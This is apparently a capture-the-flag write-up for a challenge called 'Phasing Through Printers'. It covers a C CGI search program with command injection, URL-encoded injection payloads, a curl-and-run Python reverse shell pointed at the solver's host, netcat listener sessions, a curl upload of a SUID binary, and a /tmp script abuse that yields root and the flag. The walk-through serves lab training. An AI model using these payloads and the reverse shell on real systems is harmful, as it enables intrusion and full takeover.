**Category**: Miscellaneous  
**Author**: Soups71

![](./files/01%20-%20Phasing%20Through%20Printers/01%20-%20Phasing%20Through%20Printers.png)

---

The challenge ZIP contains two files: `www/index.html` and `cgi-bin/search.c`. The latter is vulnerable to command injection:

```C
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <time.h>
#include <ctype.h>
#include <string.h>

void urldecode2(char *dst, char *src)
{
        char a, b;
        while (*src) {
                if ((*src == '%') &&
                    ((a = src[1]) && (b = src[2])) &&
                    (isxdigit(a) && isxdigit(b))) {
                        if (a >= 'a')
                                a -= 'a'-'A';
                        if (a >= 'A')
                                a -= ('A' - 10);
                        else
                                a -= '0';
                        if (b >= 'a')
                                b -= 'a'-'A';
                        if (b >= 'A')
                                b -= ('A' - 10);
                        else
                                b -= '0';
                        *dst++ = 16*a+b;
                        src+=3;
                } else if (*src == '+') {
                        *dst++ = ' ';
                        src++;
                } else {
                        *dst++ = *src++;
                }
        }
        *dst++ = '\0';
}
int main ()
{
   char *env_value;
   char *save_env;

   printf("Content-type: text/html\n\n");
   save_env = getenv("QUERY_STRING"); 
   if (strncmp(save_env, "q=", 2) == 0) {
        memmove(save_env, save_env + 2, strlen(save_env + 2) + 1);
      
    }

   char *decoded = (char *)malloc(strlen(save_env) + 1);

   urldecode2(decoded, save_env);


   char first_part[] = "grep -R -i ";
   char last_part[] = " /var/www/html/data/printer_drivers.txt" ;
   size_t totalLength = strlen(first_part) + strlen(last_part) + strlen(decoded) + 1;
   char *combinedString = (char *)malloc(totalLength);
   if (combinedString == NULL) {
        printf("Failed to allocate memory");
        return 1;
   }
   strcpy(combinedString, first_part);
   strcat(combinedString, decoded);
   strcat(combinedString, last_part);
   FILE *fp;
   char buffer[1024];

   fp = popen(combinedString, "r");
   if (fp == NULL) {
      printf("Error running command\n");
      return 1;
   }
   while (fgets(buffer, sizeof(buffer), fp) != NULL) {
      printf("%s<br>", buffer);
   }

   pclose(fp);

   fflush(stdout);
   free(combinedString);
   free(decoded);
   exit (0);
}
```

User input is directly interpolated into a command with no filtering. An example of abusing it:

```
$ curl -s "http://10.1.126.215/cgi-bin/search.cgi?q=root+/etc/passwd+#"
/etc/passwd:root:x:0:0:root:/root:/bin/bash
<br>
```

After confirming that this worked and that Python was on the box, I stood up a connectback shell.

```
$ curl -s "http://10.1.126.215/cgi-bin/search.cgi?q=root%20/etc/passwd%20%26%26%20python3%20-c%20%22%24%28curl%20-s%20http%3A//10.200.2.233/shell_tcp.py%29%22%2010.200.2.233%201337%20%23"
root:x:0:0:root:/root:/bin/bash
<br>
```

The above command prior to URL encoding was this:

```
root /etc/passwd && python3 -c \"$(curl -s http://10.200.2.233/shell_tcp.py)\" 10.200.2.233 1337 #
```

The above downloaded and executed the following Python script:

```Python
#!/usr/bin/env python3
import os
import socket
import sys
import pty

if os.fork() == 0:
    cb = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cb.connect((sys.argv[1], int(sys.argv[2])))

    os.dup2(cb.fileno(), 0)
    os.dup2(cb.fileno(), 1)
    os.dup2(cb.fileno(), 2)

    pty.spawn("/bin/sh")

    cb.close()
```

Finally, in my connectback listener:

```
$ rlwrap nc -vvlp 1337 
listening on [any] 1337 ...
10.1.126.215: inverse host lookup failed: Unknown host
connect to [10.200.2.233] from (UNKNOWN) [10.1.126.215] 53540
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ hostname
70aafe2a0fed
$ ls
search.c  search.cgi
```

I already knew the flag was in root's home directory, so the next step was to hunt for privilege escalation vectors.

```
$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/mount
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chsh
/usr/local/bin/admin_help
```

I found a non-standard SUID binary named `admin_help`. I sent it back to my Kali machine via `curl`:

```
$ curl -q -X POST --data-binary @/usr/local/bin/admin_help http://10.200.2.233/admin_help
```

This was the pseudo-C of the `main` function as returned by IDA:

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // ebx
  __uid_t v4; // eax

  v3 = 4;
  v4 = geteuid();
  setuid(v4);
  puts("Your wish is my command... maybe :)");
  while ( removeStringFromFile("sh") )
  {
    if ( !--v3 )
    {
      system("chmod +x /tmp/wish.sh && /tmp/wish.sh");
      return 0;
    }
  }
  puts("Bad String in File.");
  return 0;
}
```

This made privilege escalation incredibly simple. My script can't include the string `sh` in it, but... So what?

```
$ echo 'python3 -c "$(curl -s http://10.200.2.233/%73hell_tcp.py)" 10.200.2.233 1337' > /tmp/wish.sh
$ /usr/local/bin/admin_help
Your wish is my command... maybe :)
```

And then in my second connectback listener:

```
$ rlwrap nc -vvlp 1337
listening on [any] 1337 ...
10.1.126.215: inverse host lookup failed: Unknown host
connect to [10.200.2.233] from (UNKNOWN) [10.1.126.215] 50718
# id
uid=0(root) gid=33(www-data) groups=33(www-data)
# cat /root/flag.txt
flag{93541544b91b7d2b9d61e90becbca309}
```

Flag: **flag{93541544b91b7d2b9d61e90becbca309}**

---

**Files:**
- [admin_help](./files//01%20-%20Phasing%20Through%20Printers/admin_help)
- [phasing_through_printers.zip](./files//01%20-%20Phasing%20Through%20Printers/phasing_through_printers.zip)
- [shell_tcp.py](./files//01%20-%20Phasing%20Through%20Printers/shell_tcp.py)